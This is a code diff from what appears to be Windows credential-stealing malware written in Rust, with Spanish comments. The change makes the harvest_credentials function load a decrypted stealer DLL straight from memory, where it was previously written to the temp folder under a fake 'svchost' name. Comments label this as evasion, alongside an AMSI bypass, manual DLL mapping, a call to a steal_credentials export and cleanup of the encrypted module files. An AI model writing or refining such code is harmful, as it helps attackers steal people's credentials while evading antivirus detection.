@@ -2,6 +2,7 @@
 
 mod config;
 mod evasion;
+mod syscalls;
 
 #[cfg(target_os = "windows")]
 use std::ffi::CStr;
@@ -295,15 +296,8 @@ fn harvest_credentials() -> String {
         let dll_bytes = xor_decrypt(&encrypted_dll, &xor_key);
         println!("DEBUG: DLL desencriptada: {} bytes", dll_bytes.len());
         
-        // Escribir DLL temporal
-        let temp_dir = std::env::temp_dir();
-        let dll_path = temp_dir.join(format!("svchost{}.dll", std::process::id()));
-        
-        if let Err(e) = fs::write(&dll_path, &dll_bytes) {
-            return format!("__ERROR__:Error escribiendo DLL temporal: {}{}", e, DELIMITER);
-        }
-        
-        println!("DEBUG: DLL temporal: {}", dll_path.display());
+        // ✅ NO escribir a filesystem - cargar directamente desde memoria
+        println!("DEBUG: [EVASION] Loading DLL from memory (no filesystem touch)");
         
         // === EVASIÓN AGRESIVA ===
         println!("DEBUG: [EVASION] Bypassing AMSI...");
@@ -334,7 +328,6 @@ fn harvest_credentials() -> String {
                     addr
                 }
                 Err(e) => {
-                    fs::remove_file(&dll_path).ok();
                     return format!("__ERROR__:Manual mapping failed: {}{}", e, DELIMITER);
                 }
             };
@@ -347,7 +340,6 @@ fn harvest_credentials() -> String {
                     addr
                 }
                 None => {
-                    fs::remove_file(&dll_path).ok();
                     return format!("__ERROR__:steal_credentials not found{}", DELIMITER);
                 }
             };
@@ -358,7 +350,6 @@ fn harvest_credentials() -> String {
             let result_ptr = exec_fn();
             
             if result_ptr.is_null() {
-                fs::remove_file(&dll_path).ok();
                 return format!("__ERROR__:steal_credentials returned NULL{}", DELIMITER);
             }
             
@@ -377,10 +368,7 @@ fn harvest_credentials() -> String {
             result_str
         };
         
-        // Eliminar DLL temporal
-        fs::remove_file(&dll_path).ok();
-        
-        // Eliminar archivos del módulo
+        // Eliminar archivos del módulo (DLL nunca tocó el filesystem ✅)
         fs::remove_file("stealer.enc").ok();
         fs::remove_file("stealer.key").ok();
         
